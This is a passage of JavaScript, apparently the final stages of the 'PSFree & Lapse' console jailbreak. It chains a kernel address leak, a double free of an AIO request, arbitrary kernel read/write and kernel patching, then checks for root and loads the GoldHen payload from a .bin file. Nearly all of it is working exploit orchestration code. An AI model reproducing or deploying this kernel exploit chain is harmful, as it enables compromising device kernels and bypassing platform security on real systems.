    const [reqs1_addr, kbuf_addr, kernel_addr, target_id, evf] = leak_kernel_addrs(sd_pair);
    window.log('Lapse STAGE 3/5: Double free SceKernelAioRWRequest');
    await sleep(50); // Wait 50ms
    const [pktopts_sds, dirty_sd] = double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd_pair[0], sds);
    window.log('Lapse STAGE 4/5: Get arbitrary kernel read/write');
    await sleep(50); // Wait 50ms
    const [kbase, kmem, p_ucred, restore_info] = make_kernel_arw(pktopts_sds, dirty_sd, reqs1_addr, kernel_addr, sds);
    window.log('Lapse STAGE 5/5: Patch kernel');
    await sleep(50); // Wait 50ms
    await patch_kernel(kbase, kmem, p_ucred, restore_info);
    close(unblock_fd);
    close(block_fd);
    free_aios2(groom_ids.addr, groom_ids.length);
    aio_multi_wait(block_id.addr, 1);
    aio_multi_delete(block_id.addr, block_id.length);
    for (const sd of sds) {
      close(sd);
    }
    // Restore the thread's CPU core and realtime priority to maintain system stability during the exploit.
    // Stability tweaks from Al-Azif's source
    //log(`restoring core: ${current_core}`);
    //log(`restoring rtprio: type=${current_rtprio.type} prio=${current_rtprio.prio}`);
    pin_to_core(current_core);
    set_rtprio(current_rtprio);
    // Check if it all worked
    try {
      if (sysi('setuid', 0) == 0) {
        window.log("\nKernel exploit succeeded and AIO fixes applied", "green");
        await sleep(500); // Wait 500ms
        // Inject HEN payload
        jb_step_status = await PayloadLoader("payload.bin"); // Read payload from .bin file
        if (jb_step_status !== 1) {
          window.log("Failed to load HEN!\nPlease restart console and try again...", "red");
          return;
        }
        window.log("GoldHen loaded", "green");
        window.log("\nPSFree & Lapse exploit with AIO fixes by ABC");
      } else {
        window.log("An error occured during Lapse\nPlease restart console and try again...", "red");
        return;
      }
    } catch {
      // Still not exploited, something failed, but it made it here...
      die("kernel exploit failed!");
    }
  } catch (error) {
    window.log("An error occured during Lapse\nPlease restart console and try again...\nError definition: " + error, "red");
  }
}
// Make function globally accessible
window.doJBwithPSFreeLapseExploit = doJBwithPSFreeLapseExploit;
//================================================================================================
// End of File ===================================================================================
//================================================================================================
